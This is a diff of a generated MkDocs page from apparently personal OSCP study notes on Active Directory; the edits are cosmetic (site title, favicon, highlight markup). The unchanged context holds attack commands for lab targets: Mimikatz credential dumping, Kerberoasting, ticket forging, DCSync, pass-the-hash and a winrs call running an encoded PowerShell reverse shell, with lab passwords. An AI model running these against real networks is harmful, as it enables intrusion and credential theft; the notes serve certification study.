@@ -20,12 +20,12 @@
         
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="assets/logo2.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
-        <title>Active Directory - My site</title>
+        <title>Active Directory - Charlie's OSCP Notes</title>
       
     
     
@@ -90,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="index.html" title="My site" class="md-header__button md-logo" aria-label="My site" data-md-component="logo">
+    <a href="index.html" title="Charlie&#39;s OSCP Notes" class="md-header__button md-logo" aria-label="Charlie's OSCP Notes" data-md-component="logo">
       
   <img src="assets/logo2.png" alt="logo">
 
@@ -103,7 +103,7 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            My site
+            Charlie's OSCP Notes
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
@@ -147,12 +147,12 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="index.html" title="My site" class="md-nav__button md-logo" aria-label="My site" data-md-component="logo">
+    <a href="index.html" title="Charlie&#39;s OSCP Notes" class="md-nav__button md-logo" aria-label="Charlie's OSCP Notes" data-md-component="logo">
       
   <img src="assets/logo2.png" alt="logo">
 
     </a>
-    My site
+    Charlie's OSCP Notes
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -1848,7 +1848,7 @@ $PDC = $domainObj.PdcRoleOwner.Name
 $DN = ([adsi]'').distinguishedName
 </code></pre>
 <p>Now we can add an LDAP variable to piece together the full name</p>
-<p>==Completed Script pt 1==</p>
+<p><mark>Completed Script pt 1</mark></p>
 <pre><code class="language-Powershell">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
 $DN = ([adsi]'').distinguishedName 
 $LDAP = "LDAP://$PDC/$DN"
@@ -1856,7 +1856,7 @@ $LDAP
 </code></pre>
 <p>This script will dynamically retrieve the LDAP path</p>
 <p>Now we can build in search functionality. We can use two .NET classes that are located in the  <em>System.DirectoryServices</em> namespace
-    <em>DirectoryEntry</em> class encapsulates an object in the AD service hierarchy. We can use this to search from the very top of the structure. ==This is also where we can pass credentials if needed==
+    <em>DirectoryEntry</em> class encapsulates an object in the AD service hierarchy. We can use this to search from the very top of the structure. <mark>This is also where we can pass credentials if needed</mark>
     <em>DirectorySearcher</em> used to perform queries against AD using LDAP. We want to use the SearchRoot property
 The <em>DirectorySearcher</em> documentation lists <em>FindAll()</em>,<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/active-directory-introduction-and-enumeration/active-directory-manual-enumeration/adding-search-functionality-to-our-script#fn4">4</a> which returns a collection of all the entries found in AD.</p>
 <pre><code class="language-Powershell">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
@@ -1930,7 +1930,7 @@ We can view multiple columns of info by selecting more than one attribute, use a
 We can try a tool call PsLoggedon.exe for this enumeration task but it relies on remote registry being enabled. Remote registry is disabled by default</p>
 <pre><code class="language-Powershell">.\PsLoggedon.exe \\client74
 </code></pre>
-<p>==It's important to enumerate where users logged in to because credentials are stored in memory --&gt; if we compromise / have admin access on those machines, we can gain creds of all users who authenticated on it==</p>
+<p><mark>It's important to enumerate where users logged in to because credentials are stored in memory --&gt; if we compromise / have admin access on those machines, we can gain creds of all users who authenticated on it</mark></p>
 <p>There are a few types of service accounts: LocalSystem, LocalService, and NetworkService
 The Service Principal Name (SPN) associates a service to a specific account an Active Directory --&gt; We can query the DC for SPN info --&gt; we can use setspn.exe which is installed by default</p>
 <pre><code class="language-cmd">setspn -L iis_service
@@ -2049,7 +2049,7 @@ If we gain access to these hashes, we could crack them to obtain the cleartext p
 <em>We need to be SYSTEM or Local Admin to gain access to stored creds on a target</em> --&gt; we usually have to do a local priv esc on our target
 One of the most popular tools for credential extraction is Mimikatz
     In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the <em>Antivirus Evasion</em> Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell,<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn4">4</a> or use a built-in tool like Task Manager to dump the entire LSASS process memory,<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn5">5</a> move the dumped data to a helper machine, and then load the data into Mimikatz.<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn6">6</a></p>
-<p>==In an administrator Powershell==</p>
+<p><mark>In an administrator Powershell</mark></p>
 <pre><code class="language-Powershell">.\mimkatz.exe
 Privilege::debug
 sekurlsa::logonpasswords
@@ -2111,7 +2111,7 @@ We can use Rubeus to attempt to gain the hash for Kerberoasting</p>
 <p>From Linux we can use the tool impacket-GetUserSPNs to try and get a SPN hash</p>
 <pre><code class="language-bash">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 </code></pre>
-<p>==Note:== If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use <em>ntpdate</em><a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn3">3</a> or <em>rdate</em><a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn4">4</a> to do so.
+<p><mark>Note:</mark> If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use <em>ntpdate</em><a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn3">3</a> or <em>rdate</em><a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn4">4</a> to do so.
 If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account the password will be randomly generated and impossible to crack</p>
 <h4 id="silver-tickets">Silver Tickets</h4>
 <p>User and group permissions set in the service tickets are not verified by the service account --&gt; if we can forge tickets we can grant ourselves custom permissions
@@ -2145,24 +2145,24 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 /rc4: is the NTLM hash of the SPN (there is also a differnet hashing protocol that can be used. Be aware of this)
 /user can be any user since we can set permissions ourselves, but best to use the user we are running as
 Once we have the forged ticket we should be able to access the SPN
-==Note==:  Microsoft created a security patch to update the PAC structure.<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn5">5</a> With this patch in place, the extended PAC structure field <em>PAC_REQUESTOR</em> needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.</p>
+<mark>Note</mark>:  Microsoft created a security patch to update the PAC structure.<a href="https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn5">5</a> With this patch in place, the extended PAC structure field <em>PAC_REQUESTOR</em> needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.</p>
 <h4 id="domain-controller-synchronization-dcsync">Domain controller Synchronization (DCSYNC)</h4>
 <p>In production environments there are usually multiple DCs for redundancy.
 The DCs sync using the Direcotry Replication Service (DRS) remote protocol
 A DC may request an update using the IDL_DRSGetNCChanges API. --&gt; <strong>The DC receiving this update does not check whether the request came from a DC</strong>. Instead it just checks to make surethe associated SID has proper privileges. --&gt; If we have a user with the correct rights we can succeed in sending a rogue request.
-==We need to be part of one of the fallowing groups==
+<mark>We need to be part of one of the fallowing groups</mark>
 - Domain Admin
 - Enterprise Admins
 - Administrators
 To run this attack on windows we can can use Mimikatz to obtain credentials of other users
-==BrouhahaTungPerorateBroom2023!==</p>
+<mark>BrouhahaTungPerorateBroom2023!</mark></p>
 <pre><code class="language-mimikatz">lsadump::dcsync /user:corp\dave
 </code></pre>
 <p>In this example corp is the domain and dave is the user we want to target.
 We receive an NTLM hash of daves password which we can save off and crack with hashcat</p>
 <pre><code class="language-bash">hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 </code></pre>
-<p>==Note== We can use this to get the hash of any user in the system including the domain admin --&gt; <code>lsadump::dcsync /user:corp\Administrator</code>
+<p><mark>Note</mark> We can use this to get the hash of any user in the system including the domain admin --&gt; <code>lsadump::dcsync /user:corp\Administrator</code>
 If we are on the Kali linux box, we can do this with impacket-secretdump</p>
 <pre><code class="language-bash">impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 </code></pre>
@@ -2172,7 +2172,7 @@ If we are on the Kali linux box, we can do this with impacket-secretdump</p>
 <h2 id="lateral-movement-techniques">Lateral movement techniques</h2>
 <h3 id="wmi-and-winrm">WMI and WinRM</h3>
 <p>Windows Management Instrumentation (WMI) is capable of creating processes via the Create method from the Win32_Process class. It communicates through RPC on port 135 for remote access and higher range ports for session data
-==In order to create a process on the remote target via WMI **We need the credentials of a member of the Administrators local group on the target machine==
+<mark>In order to create a process on the remote target via WMI **We need the credentials of a member of the Administrators local group on the target machine</mark>
 Note: Unlike non-domain joined machines, there is no UAC remote restrictions when for domain users, so we can maintain privilege while moving laterally.
 the wmic utility is used to remotely spawn process on domain computers</p>
 <pre><code class="language-cmd">wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
@@ -2217,7 +2217,7 @@ a utility of WinRM is windows remote shell (winrs).</p>
 <p>-r is the host
 -u is user
 -p password
-==For WinRS to work the user must be part of the administrators or remote management group==
+<mark>For WinRS to work the user must be part of the administrators or remote management group</mark>
 To gain a reverse shell, we can use the same encoded command as before</p>
 <pre><code class="language-cmd">winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
@@ -2249,7 +2249,7 @@ PsExec is not installed by default but we can move the whole SysinternalSuite ov
 last argument is the process we want to execute</p>
 <h4 id="pass-the-hash">Pass the Hash</h4>
 <p>Pass the hash technique allows an attacker to authenticate to a remote system or service using the user's ntlm hash instead of plaintext password
-==Note this only works for servers using ntlm authentication. Will not work for Kerberos==
+<mark>Note this only works for servers using ntlm authentication. Will not work for Kerberos</mark>
 Unless we want to gain remote code execution PtH does not need to create a windows service
 Similar to PsExec, PtH needs connection to port 445 (SMB) on the remote host, and Windows File and Printer Sharing feature turned on. Also requires local Admin rights
 In this example we pass the hash of the Administrator account we already recovered.</p>
@@ -2603,7 +2603,7 @@ THMJMP2</p>
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide", "navigation.tracking", "content.code.copy", "content.code.select"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
